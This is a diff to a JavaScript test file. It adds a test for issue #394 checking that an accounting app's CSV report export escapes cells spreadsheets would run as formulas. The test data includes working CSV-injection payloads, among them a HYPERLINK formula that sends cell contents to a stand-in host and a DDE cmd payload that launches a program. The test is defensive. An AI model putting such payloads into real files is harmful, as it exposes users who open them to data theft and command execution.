@@ -601,3 +601,30 @@ test('with nothing returned, sales and purchases stand alone and no net line is 
   assert.equal(body.expenses.lines.some((l) => l.kind !== 'ACCOUNT'), false);
   assert.equal(body.netSales.amount.minor, body.grossSales.amount.minor);
 });
+
+test('an exported report never carries a cell that runs as a formula in a spreadsheet (#394)', async () => {
+  const business = await aBusyMonth();
+  const register = await business.reports.salesRegister(business.actor, MAY);
+  const csv = exportReport(
+    register,
+    {
+      columns: ['=Name', 'Amount'],
+      rows: [
+        ['=HYPERLINK("http://example.invalid/?"&A1,"fix")', '-1250.00'],
+        ["=cmd|' /C calc'!A0", '500.00'],
+        ['@SUM(A1)', '+1+2'],
+        ['\t=1+1', '-2+3'],
+      ],
+    },
+    'CSV',
+  );
+  const lines = csv.split('\n');
+  const table = lines.slice(lines.indexOf('') + 1, -1);
+  assert.deepEqual(table, [
+    "'=Name,Amount",
+    `"'=HYPERLINK(""http://example.invalid/?""&A1,""fix"")",-1250.00`,
+    "'=cmd|' /C calc'!A0,500.00",
+    "'@SUM(A1),'+1+2",
+    "'\t=1+1,'-2+3",
+  ]);
+});
